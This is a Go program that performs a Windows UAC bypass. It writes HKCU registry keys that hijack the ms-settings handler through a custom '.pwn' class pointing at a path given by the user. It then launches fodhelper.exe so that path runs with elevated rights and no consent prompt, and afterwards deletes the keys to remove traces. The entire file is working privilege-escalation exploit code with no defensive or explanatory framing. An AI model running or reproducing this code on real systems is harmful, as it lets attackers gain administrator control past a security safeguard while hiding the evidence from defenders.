package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"time"

	"golang.org/x/sys/windows/registry"
)

func main() {

	if len(os.Args) < 2 {
		fmt.Println("Error arguments, please use: ./program <path>")
		os.Exit(1)
	}

	tarPath := os.Args[1]

	if createRegParams(tarPath) {
		cmd := exec.Command("c:\\Windows\\System32\\cmd.exe", "/c", "c:\\Windows\\System32\\fodhelper.exe")
		cmd.Stderr = os.Stderr
		cmd.Stdout = os.Stdout

		if err := cmd.Start(); err != nil {
			fmt.Println("Error: ", err)
		}

		time.Sleep(2 * time.Second)
		cleanReg()

	} else {
		os.Exit(1)
	}

}

func cleanReg() {
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\\Classes\\ms-settings\\CurVer`, registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	err = registry.DeleteKey(registry.CURRENT_USER, `SOFTWARE\\Classes\\ms-settings\\CurVer`)
	if err != nil {
		log.Fatal(err)
	}
	err = registry.DeleteKey(registry.CURRENT_USER, `SOFTWARE\\Classes\\ms-settings`)
	if err != nil {
		log.Fatal(err)
	}

	k, err = registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\\Classes\\.pwn\\Shell\\Open\\command`, registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
	}

	err = registry.DeleteKey(registry.CURRENT_USER, `SOFTWARE\\Classes\\.pwn\\Shell\\Open\\command`)
	if err != nil {
		log.Fatal(err)
	}
	err = registry.DeleteKey(registry.CURRENT_USER, `SOFTWARE\\Classes\\.pwn\\Shell\\Open`)
	if err != nil {
		log.Fatal(err)
	}

	err = registry.DeleteKey(registry.CURRENT_USER, `SOFTWARE\\Classes\\.pwn\\Shell`)
	if err != nil {
		log.Fatal(err)
	}

	err = registry.DeleteKey(registry.CURRENT_USER, `SOFTWARE\\Classes\\.pwn`)
	if err != nil {
		log.Fatal(err)
	}
}

func createRegParams(tarPath string) bool {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, "SOFTWARE\\Classes\\.pwn\\Shell\\Open\\command", registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
		return false
	}
	defer key.Close()

	err = key.SetStringValue("", tarPath)
	if err != nil {
		log.Fatal(err)
		return false
	}

	key, _, err = registry.CreateKey(registry.CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\CurVer", registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
		return false
	}
	err = key.SetStringValue("", ".pwn")
	if err != nil {
		log.Fatal(err)
		return false
	}

	return true
}
